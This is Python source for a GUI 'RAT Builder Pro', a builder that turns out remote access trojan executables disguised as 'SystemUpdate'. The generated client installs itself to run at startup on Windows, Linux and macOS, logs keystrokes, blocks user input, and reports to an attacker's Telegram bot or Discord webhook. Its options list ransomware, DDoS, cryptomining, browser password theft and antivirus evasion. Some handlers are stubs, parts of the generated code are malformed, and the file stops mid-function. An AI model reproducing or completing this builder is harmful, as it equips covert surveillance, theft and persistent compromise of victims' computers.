import os
import sys
import json
import threading
import tempfile
import shutil
import subprocess
import platform
import socket
import uuid
import time
from pathlib import Path
from datetime import datetime
import zipfile
import tarfile
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import qdarkstyle
from cryptography.fernet import Fernet

class ModernButton(QPushButton):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setMinimumHeight(40)
        self.setCursor(Qt.PointingHandCursor)
        
class TerminalWidget(QTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setReadOnly(True)
        font = QFont("Consolas", 10)
        self.setFont(font)

class SplashScreen(QSplashScreen):
    def __init__(self):
        # Create a simple splash screen
        pixmap = QPixmap(600, 400)
        pixmap.fill(QColor(30, 30, 30))
        
        # Draw text directly on pixmap
        painter = QPainter(pixmap)
        painter.setPen(QColor(0, 255, 0))
        painter.setFont(QFont("Courier New", 24, QFont.Bold))
        painter.drawText(pixmap.rect(), Qt.AlignCenter, "RAT Builder Pro")
        
        painter.setFont(QFont("Courier New", 12))
        painter.drawText(0, 350, 600, 50, Qt.AlignCenter, "Cross-Platform Remote Administration Toolkit")
        painter.end()
        
        super().__init__(pixmap)
        
        self.progress_value = 0
        self.status_text = "Initializing..."
        
    def drawContents(self, painter):
        """Override to draw custom progress bar"""
        super().drawContents(painter)
        
        # Draw progress bar background
        progress_bg = QRect(100, 320, 400, 20)
        painter.setPen(QColor(0, 255, 0))
        painter.drawRect(progress_bg)
        
        # Draw progress bar fill
        progress_width = int(400 * self.progress_value / 100)
        progress_fill = QRect(100, 320, progress_width, 20)
        painter.fillRect(progress_fill, QColor(0, 255, 0))
        
        # Draw status text
        painter.setPen(QColor(200, 200, 200))
        painter.setFont(QFont("Courier New", 10))
        painter.drawText(0, 290, 600, 20, Qt.AlignCenter, f"{self.status_text} {self.progress_value}%")
        
        # Draw version info
        painter.setPen(QColor(100, 100, 100))
        painter.setFont(QFont("Courier New", 8))
        painter.drawText(0, 370, 600, 20, Qt.AlignCenter, "Version 3.0 | Multi-Platform Support")
    
    def set_progress(self, value, status="Loading"):
        """Update progress and repaint"""
        self.progress_value = value
        self.status_text = status
        self.repaint()  # This triggers drawContents


class CrossPlatformRATBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.temp_dir = tempfile.mkdtemp()
        self.config_file = "rat_builder_config.json"
        self.current_platform = platform.system().lower()
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.init_ui()
        self.load_config()
        
    def init_ui(self):
        self.setWindowTitle("RAT Builder Pro - Cross-Platform Security Tool")
        self.setGeometry(100, 100, 1600, 1000)
        
        # Apply modern dark theme
        self.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5() + """
            QMainWindow {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #1e1e1e, stop:1 #2d2d2d);
            }
            QTabWidget::pane {
                border: 2px solid #444;
                background-color: #2d2d2d;
                border-radius: 8px;
            }
            QTabBar::tab {
                background-color: #3d3d3d;
                color: #ffffff;
                padding: 12px 24px;
                margin-right: 2px;
                border: 1px solid #555;
                border-bottom: none;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background-color: #00ff00;
                color: #000000;
                border-color: #00cc00;
            }
            QTabBar::tab:hover {
                background-color: #4d4d4d;
            }
            QGroupBox {
                color: #00ff00;
                font-weight: bold;
                font-size: 12px;
                border: 2px solid #555;
                border-radius: 8px;
                margin-top: 15px;
                padding-top: 15px;
                background-color: #2d2d2d;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 15px;
                padding: 0 10px 0 10px;
                background-color: #2d2d2d;
            }
            QTextEdit, QLineEdit, QComboBox, QSpinBox {
                background-color: #1a1a1a;
                color: #ffffff;
                border: 2px solid #555;
                border-radius: 6px;
                padding: 8px;
                font-family: 'Courier New';
                font-size: 11px;
            }
            QTextEdit:focus, QLineEdit:focus, QComboBox:focus {
                border-color: #00ff00;
            }
            QCheckBox {
                color: #ffffff;
                spacing: 8px;
                font-weight: bold;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
                border-radius: 4px;
            }
            QCheckBox::indicator:unchecked {
                border: 2px solid #555;
                background-color: #2d2d2d;
            }
            QCheckBox::indicator:checked {
                border: 2px solid #00ff00;
                background-color: #00ff00;
            }
            QProgressBar {
                border: 2px solid #555;
                border-radius: 6px;
                text-align: center;
                color: white;
                background-color: #1a1a1a;
                height: 25px;
                font-weight: bold;
            }
            QProgressBar::chunk {
                background-color: qlineargradient(
                    x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00ff00, stop:1 #00cc00
                );
                border-radius: 4px;
            }
        """)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        # Header
        header = QLabel("RAT Builder Pro - Cross-Platform")
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("""
            color: #00ff00;
            font-size: 24px;
            font-weight: bold;
            font-family: 'Courier New';
            padding: 15px;
            background-color: #2d2d2d;
            border-radius: 8px;
            margin: 5px;
        """)
        layout.addWidget(header)
        
        # Platform indicator
        platform_info = QLabel(f"Target Platform: {platform.system()} {platform.release()}")
        platform_info.setAlignment(Qt.AlignCenter)
        platform_info.setStyleSheet("""
            color: #cccccc;
            font-size: 12px;
            font-family: 'Courier New';
            padding: 5px;
        """)
        layout.addWidget(platform_info)
        
        tabs = QTabWidget()
        layout.addWidget(tabs)
        
        # Create tabs
        tabs.addTab(self.create_config_tab(), "🔧 Configuration")
        tabs.addTab(self.create_features_tab(), "⚡ Features")
        tabs.addTab(self.create_advanced_tab(), "🔬 Advanced")
        tabs.addTab(self.create_build_tab(), "🏗️ Build")
        tabs.addTab(self.create_terminal_tab(), "💻 Terminal")
        
    def create_config_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Communication Configuration
        comm_group = QGroupBox("Communication Settings")
        comm_layout = QGridLayout(comm_group)
        
        comm_layout.addWidget(QLabel("Communication Method:"), 0, 0)
        self.comm_method = QComboBox()
        self.comm_method.addItems(["Telegram", "Discord", "HTTP Server", "Custom TCP"])
        self.comm_method.currentTextChanged.connect(self.on_comm_method_changed)
        comm_layout.addWidget(self.comm_method, 0, 1)
        
        # Telegram Settings
        self.telegram_frame = QWidget()
        telegram_layout = QGridLayout(self.telegram_frame)
        telegram_layout.addWidget(QLabel("Bot Token:"), 0, 0)
        self.bot_token = QLineEdit()
        self.bot_token.setPlaceholderText("1234567890:ABCdefGHIjklMNOpqrstUVWxyz123456")
        telegram_layout.addWidget(self.bot_token, 0, 1)
        
        telegram_layout.addWidget(QLabel("Trusted Users:"), 1, 0)
        self.trusted_users = QLineEdit()
        self.trusted_users.setPlaceholderText("123456789,987654321")
        telegram_layout.addWidget(self.trusted_users, 1, 1)
        
        telegram_layout.addWidget(QLabel("Trusted Chats:"), 2, 0)
        self.trusted_chats = QLineEdit()
        self.trusted_chats.setPlaceholderText("-1001234567890,-1009876543210")
        telegram_layout.addWidget(self.trusted_chats, 2, 1)
        comm_layout.addWidget(self.telegram_frame, 1, 0, 1, 2)
        
        # Discord Settings (initially hidden)
        self.discord_frame = QWidget()
        self.discord_frame.setVisible(False)
        discord_layout = QGridLayout(self.discord_frame)
        discord_layout.addWidget(QLabel("Webhook URL:"), 0, 0)
        self.discord_webhook = QLineEdit()
        self.discord_webhook.setPlaceholderText("https://discord.com/api/webhooks/...")
        discord_layout.addWidget(self.discord_webhook, 0, 1)
        comm_layout.addWidget(self.discord_frame, 1, 0, 1, 2)
        
        # Connection Settings
        conn_group = QGroupBox("Connection Settings")
        conn_layout = QGridLayout(conn_group)
        
        conn_layout.addWidget(QLabel("Check Interval (s):"), 0, 0)
        self.check_interval = QSpinBox()
        self.check_interval.setRange(5, 300)
        self.check_interval.setValue(10)
        conn_layout.addWidget(self.check_interval, 0, 1)
        
        layout.addWidget(conn_group)
        layout.addWidget(comm_group)
        
        # Platform-specific settings
        platform_group = QGroupBox("Platform Configuration")
        platform_layout = QGridLayout(platform_group)
        
        platform_layout.addWidget(QLabel("Target OS:"), 0, 0)
        self.target_os = QComboBox()
        self.target_os.addItems(["Windows", "Linux", "macOS", "All"])
        platform_layout.addWidget(self.target_os, 0, 1)
        
        platform_layout.addWidget(QLabel("Architecture:"), 1, 0)
        self.architecture = QComboBox()
        self.architecture.addItems(["x64", "x86", "arm64", "universal"])
        platform_layout.addWidget(self.architecture, 1, 1)
        
        layout.addWidget(platform_group)
        
        # Persistence Options
        persist_group = QGroupBox("Persistence & Stealth")
        persist_layout = QGridLayout(persist_group)
        
        self.auto_start = QCheckBox("Enable Auto-Start")
        self.auto_start.setChecked(True)
        persist_layout.addWidget(self.auto_start, 0, 0)
        
        self.hide_file = QCheckBox("Hide Files/Folders")
        self.hide_file.setChecked(True)
        persist_layout.addWidget(self.hide_file, 0, 1)
        
        self.anti_analysis = QCheckBox("Anti-Analysis Techniques")
        persist_layout.addWidget(self.anti_analysis, 1, 0)
        
        self.process_injection = QCheckBox("Process Injection (Windows)")
        persist_layout.addWidget(self.process_injection, 1, 1)
        
        layout.addWidget(persist_group)
        
        layout.addStretch()
        return widget
        
    def on_comm_method_changed(self, method):
        self.telegram_frame.setVisible(method == "Telegram")
        self.discord_frame.setVisible(method == "Discord")
        
    def create_features_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Core Features
        core_group = QGroupBox("Core Surveillance Features")
        core_layout = QGridLayout(core_group)
        
        features = [
            ("Keylogger", "feature_keylogger", True),
            ("Screenshot Capture", "feature_screenshot", True),
            ("File Manager", "feature_file_manager", True),
            ("Remote Shell", "feature_remote_shell", True),
            ("Process Manager", "feature_process_manager", True),
            ("Webcam Capture", "feature_webcam", False),
            ("Microphone Recording", "feature_microphone", False),
            ("Clipboard Monitoring", "feature_clipboard", True),
            ("Browser Password Extraction", "feature_browser_pass", False),
            ("Network Information", "feature_network_info", True),
            ("System Information", "feature_system_info", True),
            ("Installed Software", "feature_software_list", True),
        ]
        
        row, col = 0, 0
        for name, attr, default in features:
            checkbox = QCheckBox(name)
            checkbox.setChecked(default)
            setattr(self, attr, checkbox)
            core_layout.addWidget(checkbox, row, col)
            col += 1
            if col > 1:
                col = 0
                row += 1
                
        layout.addWidget(core_group)
        
        # Advanced Features
        advanced_group = QGroupBox("Advanced Capabilities")
        advanced_layout = QGridLayout(advanced_group)
        
        advanced_features = [
            ("Block Input", "feature_block_input", True),
            ("Desktop Live Stream", "feature_live_stream", False),
            ("Persistence Manager", "feature_persistence_mgr", True),
            ("Reverse Proxy", "feature_reverse_proxy", False),
            ("Port Scanner", "feature_port_scanner", True),
            ("Network Sniffer", "feature_network_sniffer", False),
            ("Cryptocurrency Miner", "feature_miner", False),
            ("Ransomware Module", "feature_ransomware", False),
            ("DDoS Capability", "feature_ddos", False),
        ]
        
        row, col = 0, 0
        for name, attr, default in advanced_features:
            checkbox = QCheckBox(name)
            checkbox.setChecked(default)
            setattr(self, attr, checkbox)
            advanced_layout.addWidget(checkbox, row, col)
            col += 1
            if col > 1:
                col = 0
                row += 1
                
        layout.addWidget(advanced_group)
        layout.addStretch()
        return widget
        
    def create_advanced_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Encryption Settings
        encryption_group = QGroupBox("Encryption & Security")
        encryption_layout = QGridLayout(encryption_group)
        
        encryption_layout.addWidget(QLabel("Communication Encryption:"), 0, 0)
        self.encryption_type = QComboBox()
        self.encryption_type.addItems(["AES-256", "ChaCha20", "RSA-2048", "None"])
        encryption_layout.addWidget(self.encryption_type, 0, 1)
        
        encryption_layout.addWidget(QLabel("Data Exfiltration:"), 1, 0)
        self.exfiltration_method = QComboBox()
        self.exfiltration_method.addItems(["Direct Upload", "Chunked Transfer", "Steganography", "DNS Tunneling"])
        encryption_layout.addWidget(self.exfiltration_method, 1, 1)
        
        layout.addWidget(encryption_group)
        
        # Evasion Techniques
        evasion_group = QGroupBox("Evasion Techniques")
        evasion_layout = QGridLayout(evasion_group)
        
        self.evasion_vm = QCheckBox("VM Detection Bypass")
        evasion_layout.addWidget(self.evasion_vm, 0, 0)
        
        self.evasion_sandbox = QCheckBox("Sandbox Detection")
        evasion_layout.addWidget(self.evasion_sandbox, 0, 1)
        
        self.evasion_av = QCheckBox("Antivirus Evasion")
        evasion_layout.addWidget(self.evasion_av, 1, 0)
        
        self.evasion_debug = QCheckBox("Debugger Detection")
        evasion_layout.addWidget(self.evasion_debug, 1, 1)
        
        layout.addWidget(evasion_group)
        
        # Custom Commands
        custom_group = QGroupBox("Custom Command Modules")
        custom_layout = QVBoxLayout(custom_group)
        
        self.custom_commands = QTextEdit()
        self.custom_commands.setPlaceholderText(
            "Add custom commands here...\n"
            "Format: /command_name - Description\n"
            "Example:\n"
            "/bitcoin - Get Bitcoin wallet info\n"
            "/shutdown - Shutdown system\n"
            "/browser_history - Extract browser history"
        )
        self.custom_commands.setMaximumHeight(150)
        custom_layout.addWidget(self.custom_commands)
        
        layout.addWidget(custom_group)
        
        # Build Optimization
        optimization_group = QGroupBox("Build Optimization")
        optimization_layout = QGridLayout(optimization_group)
        
        optimization_layout.addWidget(QLabel("Compression Level:"), 0, 0)
        self.compression_level = QComboBox()
        self.compression_level.addItems(["None", "Fast", "Standard", "Maximum"])
        optimization_layout.addWidget(self.compression_level, 0, 1)
        
        optimization_layout.addWidget(QLabel("Obfuscation:"), 1, 0)
        self.obfuscation_level = QComboBox()
        self.obfuscation_level.addItems(["None", "Basic", "Advanced", "Maximum"])
        optimization_layout.addWidget(self.obfuscation_level, 1, 1)
        
        layout.addWidget(optimization_group)
        layout.addStretch()
        return widget
        
    def create_build_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Build Configuration
        build_group = QGroupBox("Build Configuration")
        build_layout = QGridLayout(build_group)
        
        build_layout.addWidget(QLabel("Output Name:"), 0, 0)
        self.output_name = QLineEdit()
        self.output_name.setText("SystemUpdate" + (".exe" if self.current_platform == "windows" else ""))
        build_layout.addWidget(self.output_name, 0, 1)
        
        build_layout.addWidget(QLabel("Output Directory:"), 1, 0)
        output_dir_layout = QHBoxLayout()
        self.output_dir = QLineEdit()
        self.output_dir.setText(str(Path.home() / "Desktop" / "RAT_Builds"))
        output_dir_layout.addWidget(self.output_dir)
        browse_btn = ModernButton("📁 Browse")
        browse_btn.clicked.connect(self.browse_output_dir)
        output_dir_layout.addWidget(browse_btn)
        build_layout.addLayout(output_dir_layout, 1, 1)
        
        build_layout.addWidget(QLabel("Python Version:"), 2, 0)
        self.python_version = QComboBox()
        self.python_version.addItems(["3.8", "3.9", "3.10", "3.11", "3.12"])
        self.python_version.setCurrentText("3.10")
        build_layout.addWidget(self.python_version, 2, 1)
        
        layout.addWidget(build_group)
        
        # Build Options
        options_group = QGroupBox("Build Options")
        options_layout = QGridLayout(options_group)
        
        self.onefile = QCheckBox("Single Executable")
        self.onefile.setChecked(True)
        options_layout.addWidget(self.onefile, 0, 0)
        
        self.noconsole = QCheckBox("No Console Window")
        self.noconsole.setChecked(True)
        options_layout.addWidget(self.noconsole, 0, 1)
        
        self.upx_compress = QCheckBox("UPX Compression")
        self.upx_compress.setChecked(True)
        options_layout.addWidget(self.upx_compress, 1, 0)
        
        self.clean_build = QCheckBox("Clean Build Directory")
        self.clean_build.setChecked(True)
        options_layout.addWidget(self.clean_build, 1, 1)
        
        layout.addWidget(options_group)
        
        # Build Actions
        actions_group = QGroupBox("Build Actions")
        actions_layout = QHBoxLayout(actions_group)
        
        self.validate_btn = ModernButton("🔍 Validate Configuration")
        self.validate_btn.clicked.connect(self.validate_configuration)
        actions_layout.addWidget(self.validate_btn)
        
        self.build_btn = ModernButton("🏗️ Build Executable")
        self.build_btn.clicked.connect(self.build_executable)
        self.build_btn.setStyleSheet("background-color: #00aa00; color: white; font-weight: bold;")
        actions_layout.addWidget(self.build_btn)
        
        self.export_btn = ModernButton("💾 Save Configuration")
        self.export_btn.clicked.connect(self.save_config)
        actions_layout.addWidget(self.export_btn)
        
        layout.addWidget(actions_group)
        
        # Build Progress
        progress_group = QGroupBox("Build Progress")
        progress_layout = QVBoxLayout(progress_group)
        
        self.build_progress = QProgressBar()
        progress_layout.addWidget(self.build_progress)
        
        self.build_status = QLabel("Ready to build...")
        self.build_status.setStyleSheet("color: #00ff00; font-weight: bold;")
        progress_layout.addWidget(self.build_status)
        
        # Build log
        self.build_log = QTextEdit()
        self.build_log.setMaximumHeight(150)
        self.build_log.setStyleSheet("font-family: 'Courier New'; font-size: 10px;")
        progress_layout.addWidget(self.build_log)
        
        layout.addWidget(progress_group)
        layout.addStretch()
        return widget
        
    def create_terminal_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Terminal header
        terminal_header = QLabel("Build Terminal - Real-time Output")
        terminal_header.setStyleSheet("""
            color: #00ff00;
            font-weight: bold;
            font-size: 14px;
            padding: 10px;
            background-color: #2d2d2d;
            border-radius: 5px;
        """)
        layout.addWidget(terminal_header)
        
        self.terminal = TerminalWidget()
        layout.addWidget(self.terminal)
        
        # Initial terminal message
        self.log_message("🚀 RAT Builder Pro Terminal Initialized")
        self.log_message(f"📋 Platform: {platform.system()} {platform.release()}")
        self.log_message(f"🐍 Python: {sys.version.split()[0]}")
        self.log_message("✅ Ready for configuration and building")
        
        return widget
        
    def browse_output_dir(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Output Directory", str(Path.home()))
        if directory:
            self.output_dir.setText(directory)
            
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.terminal.append(f"[{timestamp}] {message}")
        QApplication.processEvents()
        
    def log_build(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.build_log.append(f"[{timestamp}] {message}")
        QApplication.processEvents()
        
    def validate_configuration(self):
        self.log_message("🔍 Validating configuration...")
        
        errors = []
        
        if self.comm_method.currentText() == "Telegram" and not self.bot_token.text().strip():
            errors.append("Bot token is required for Telegram communication")
            
        if not self.trusted_users.text().strip():
            errors.append("At least one trusted user ID is required")
            
        if self.feature_webcam.isChecked() and self.current_platform == "linux":
            self.log_message("⚠️ Webcam feature may require additional dependencies on Linux")
            
        if errors:
            for error in errors:
                self.log_message(f"❌ {error}")
            QMessageBox.warning(self, "Validation Errors", "\n".join(errors))
            return False
            
        self.log_message("✅ Configuration validation passed!")
        return True

    def generate_cross_platform_rat(self):
        """Generate cross-platform RAT code with all features"""
        
        trusted_users_str = self.trusted_users.text().strip()
        trusted_chats_str = self.trusted_chats.text().strip()
        
        code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cross-Platform RAT Client
Generated by RAT Builder Pro
Platform: {self.target_os.currentText()}
Timestamp: {datetime.now().isoformat()}
"""

import os
import sys
import time
import json
import shutil
import threading
import subprocess
import platform
import socket
import getpass
import uuid
from pathlib import Path
from datetime import datetime

# Platform-specific imports
{self.get_platform_specific_imports()}

# Feature imports
{self.get_feature_imports()}

class CrossPlatformRAT:
    def __init__(self):
        self.config = {{
            'bot_token': '{self.bot_token.text().strip()}',
            'trusted_users': [{trusted_users_str}],
            'trusted_chats': [{trusted_chats_str}],
            'platform': platform.system().lower(),
            'check_interval': {self.check_interval.value()}
        }}
        self.session_id = str(uuid.uuid4())
        self.keylogger_active = False
        self.keylogger_file = "system_log.txt"
        
        # Initialize platform-specific components
        self.setup_platform_specific()
        
        # Start main loop
        self.main_loop()
    
    def setup_platform_specific(self):
        """Setup platform-specific configurations"""
        current_platform = platform.system().lower()
        
        if current_platform == "windows":
            self.setup_windows()
        elif current_platform == "linux":
            self.setup_linux()
        elif current_platform == "darwin":
            self.setup_macos()
    
    def setup_windows(self):
        """Windows-specific setup"""
        try:
            import winreg
            import win32api
            import winshell
            
            if {str(self.auto_start.isChecked()).lower()}:
                self.setup_autostart_windows()
                
        except ImportError as e:
            print(f"Windows imports not available: {{e}}")
    
    def setup_linux(self):
        """Linux-specific setup"""
        try:
            if {str(self.auto_start.isChecked()).lower()}:
                self.setup_autostart_linux()
        except Exception as e:
            print(f"Linux setup error: {{e}}")
    
    def setup_macos(self):
        """macOS-specific setup"""
        try:
            if {str(self.auto_start.isChecked()).lower()}:
                self.setup_autostart_macos()
        except Exception as e:
            print(f"macOS setup error: {{e}}")
    
    def setup_autostart_windows(self):
        """Windows autostart setup"""
        try:
            import winreg
            import win32api
            
            app_path = os.path.abspath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, app_path)
                
        except Exception as e:
            print(f"Autostart setup failed: {{e}}")
    
    def setup_autostart_linux(self):
        """Linux autostart setup"""
        try:
            autostart_dir = Path.home() / ".config" / "autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)
            
            desktop_file = autostart_dir / "system-update.desktop"
            app_path = os.path.abspath(sys.argv[0])
            
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update
Exec={{app_path}}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            desktop_file.write_text(desktop_content)
            os.chmod(str(desktop_file), 0o755)
            
        except Exception as e:
            print(f"Linux autostart failed: {{e}}")
    
    def setup_autostart_macos(self):
        """macOS autostart setup"""
        try:
            launch_agents_dir = Path.home() / "Library" / "LaunchAgents"
            launch_agents_dir.mkdir(parents=True, exist_ok=True)
            
            plist_file = launch_agents_dir / "com.system.update.plist"
            app_path = os.path.abspath(sys.argv[0])
            
            plist_content = f```
            <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{app_path}}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>```
            plist_file.write_text(plist_content)
            
        except Exception as e:
            print(f"macOS autostart failed: {{e}}")
    
    def send_message(self, message):
        """Send message via configured communication method"""
        try:
            comm_method = "{self.comm_method.currentText()}"
            
            if comm_method == "Telegram":
                self.send_telegram(message)
            elif comm_method == "Discord":
                self.send_discord(message)
            else:
                print(f"Message: {{message}}")
                
        except Exception as e:
            print(f"Send message failed: {{e}}")
    
    def send_telegram(self, message):
        """Send message via Telegram"""
        try:
            import telepot
            bot = telepot.Bot(self.config['bot_token'])
            
            for user_id in self.config['trusted_users']:
                try:
                    bot.sendMessage(user_id, message)
                except:
                    pass
                    
            for chat_id in self.config['trusted_chats']:
                try:
                    bot.sendMessage(chat_id, message)
                except:
                    pass
                    
        except Exception as e:
            print(f"Telegram send failed: {{e}}")
    
    def send_discord(self, message):
        """Send message via Discord webhook"""
        try:
            import requests
            webhook_url = "{self.discord_webhook.text().strip()}"
            
            payload = {{
                "content": message,
                "username": "System Monitor"
            }}
            
            requests.post(webhook_url, json=payload)
            
        except Exception as e:
            print(f"Discord send failed: {{e}}")
    
    {self.generate_command_handlers()}
    
    def check_commands(self):
        """Check for incoming commands"""
        # Placeholder for command checking logic
        pass
    
    def main_loop(self):
        """Main RAT loop"""
        self.send_message(f"🤖 RAT Started on {{platform.system()}} - Session: {{self.session_id}}")
        
        while True:
            try:
                # Check for commands and perform tasks
                self.check_commands()
                time.sleep(self.config['check_interval'])
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Main loop error: {{e}}")
                time.sleep(30)

if __name__ == '__main__':
    rat = CrossPlatformRAT()
'''
        return code

    def get_platform_specific_imports(self):
        """Generate platform-specific import statements"""
        imports = []
        
        # Windows imports
        if self.target_os.currentText() in ["Windows", "All"]:
            imports.extend([
                "try:",
                "    import winreg",
                "    import win32api",
                "    import winshell",
                "    import pythoncom",
                "except ImportError:",
                "    pass"
            ])
        
        # Cross-platform imports for all systems
        imports.extend([
            "import requests",
            "from PIL import ImageGrab",
            "import pynput.keyboard",
            "import pynput.mouse"
        ])
        
        return "\n".join(imports)

    def get_feature_imports(self):
        """Generate imports based on selected features"""
        imports = []
        
        if self.feature_keylogger.isChecked():
            imports.append("from pynput import keyboard")
            
        if self.feature_screenshot.isChecked():
            imports.append("from PIL import ImageGrab")
            
        if self.feature_webcam.isChecked():
            imports.extend([
                "try:",
                "    import cv2",
                "except ImportError:",
                "    pass"
            ])
            
        return "\n".join(imports)

    def generate_command_handlers(self):
        """Generate command handler methods based on selected features"""
        handlers = []
        
        # Basic commands
        basic_commands = [
            ("execute_command", "Execute system command"),
            ("get_system_info", "Get detailed system information"),
            ("list_files", "List directory contents"),
            ("download_file", "Download file from target"),
            ("upload_file", "Upload file to target"),
            ("take_screenshot", "Capture screenshot"),
        ]
        
        for method_name, description in basic_commands:
            handlers.append(f'''
    def {method_name}(self, args):
        """{description}"""
        try:
            # Implementation for {method_name}
            self.send_message("Command {{method_name}} executed")
        except Exception as e:
            self.send_message(f"Error in {{method_name}}: {{e}}")
''')
        
        # Advanced features
        if self.feature_keylogger.isChecked():
            handlers.append('''
    def start_keylogger(self, args):
        """Start keylogging"""
        try:
            self.keylogger_active = True
            self.keylogger_thread = threading.Thread(target=self.keylogger_worker)
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()
            self.send_message("Keylogger started")
        except Exception as e:
            self.send_message(f"Keylogger start failed: {e}")
            
    def stop_keylogger(self, args):
        """Stop keylogging"""
        try:
            self.keylogger_active = False
            self.send_message("Keylogger stopped")
        except Exception as e:
            self.send_message(f"Keylogger stop failed: {e}")
            
    def keylogger_worker(self):
        """Keylogger background worker"""
        def on_press(key):
            if self.keylogger_active:
                with open(self.keylogger_file, "a") as f:
                    f.write(f"{key} ")
                    
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()
''')
        
        if self.feature_block_input.isChecked():
            handlers.append('''
    def block_input(self, args):
        """Block user input"""
        try:
            seconds = int(args[0]) if args else 10
            self.send_message(f"Blocking input for {seconds} seconds")
            
            # Platform-specific input blocking
            if platform.system().lower() == "windows":
                import ctypes
                ctypes.windll.user32.BlockInput(True)
                time.sleep(seconds)
                ctypes.windll.user32.BlockInput(False)
            else:
                # Linux/macOS input blocking would require root
                self.send_message("Input blocking requires root privileges on this platform")
                
            self.send_message("Input unblocked")
        except Exception as e:
            self.send_message(f"Input block failed: {e}")
''')
        
        return "\n".join(handlers)

    def build_executable(self):
        """Build the RAT executable for target platform"""
        if not self.validate_configuration():
            return

        try:
            self.log_message("🚀 Starting cross-platform build process...")
            self.build_progress.setValue(0)
            
            # Create output directory
            output_dir = Path(self.output_dir.text())
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Step 1: Generate source code
            self.build_progress.setValue(20)
            self.build_status.setText("Generating source code...")
            self.log_build("📝 Generating RAT source code...")
            
            rat_code = self.generate_cross_platform_rat()
            source_file = Path(self.temp_dir) / "rat_client.py"
            with open(source_file, 'w', encoding='utf-8') as f:
                f.write(rat_code)
            
            # Step 2: Create requirements
            self.build_progress.setValue(40)
            self.build_status.setText("Setting up dependencies...")
            self.log_build("📦 Configuring dependencies...")
            
            requirements_file = Path(self.temp_dir) / "requirements.txt"
            requirements_content = self.generate_requirements_file()
            with open(requirements_file, 'w') as f:
                for req in requirements_content:
                    f.write(req + '\n')
            
            # Step 3: Build for target platform
            self.build_progress.setValue(60)
            self.build_status.setText("Compiling executable...")
            self.log_build("🔨 Compiling executable...")
            
            target_os = self.target_os.currentText().lower()
            if target_os == "all":
                self.build_for_all_platforms(output_dir, source_file)
            else:
                self.build_for_platform(target_os, output_dir, source_file)
            
            # Step 4: Finalize
            self.build_progress.setValue(90)
            self.build_status.setText("Finalizing build...")
            self.log_build("🎉 Build completed successfully!")
            
            self.build_progress.setValue(100)
            self.build_status.setText("Build completed!")
            
            QMessageBox.information(self, "Build Complete", 
                                  "RAT executable(s) built successfully!\\n"
                                  f"Location: {output_dir}")
            
        except Exception as e:
            self.log_message(f"❌ Build failed: {str(e)}")
            self.build_status.setText("Build failed!")
            QMessageBox.critical(self, "Build Failed", f"Build process failed:\\n{str(e)}")

    def generate_requirements_file(self):
        """Generate requirements.txt based on selected features"""
        requirements = [
            "requests>=2.28.0",
            "pillow>=9.0.0",
            "pynput>=1.7.0",
        ]
        
        if self.comm_method.currentText() == "Telegram":
            requirements.append("telepot>=1.4")
            
        if self.feature_webcam.isChecked():
            requirements.append("opencv-python>=4.5.0")
            
        if platform.system().lower() == "windows":
            requirements.extend([
                "pywin32>=300",
                "winshell>=0.6"
            ])
            
        return requirements

    def build_for_platform(self, platform_name, output_dir, source_file):
        """Build executable for specific platform"""
        try:
            output_name = self.output_name.text()
            
            if platform_name == "windows":
                self.build_windows_exe(output_dir, source_file, output_name)
            elif platform_name == "linux":
                self.build_linux_exe(output_dir, source_file, output_name)
            elif platform_name == "macos":
                self.build_macos_exe(output_dir, source_file, output_name)
                
        except Exception as e:
            raise Exception(f"Failed to build for {platform_name}: {str(e)}")

    def build_windows_exe(self, output_dir, source_file, output_name):
        """Build Windows executable using PyInstaller"""
        pyinstaller_cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole" if self.noconsole.isChecked() else "--console",
            "--name", output_name.replace('.exe', ''),
            "--distpath", str(output_dir),
            "--workpath", str(Path(self.temp_dir) / "build"),
            "--specpath", str(Path(self.temp_dir)),
            str(source_file)
        ]
        
        if self.upx_compress.isChecked():
            pyinstaller_cmd.append("--upx-dir=.")
            
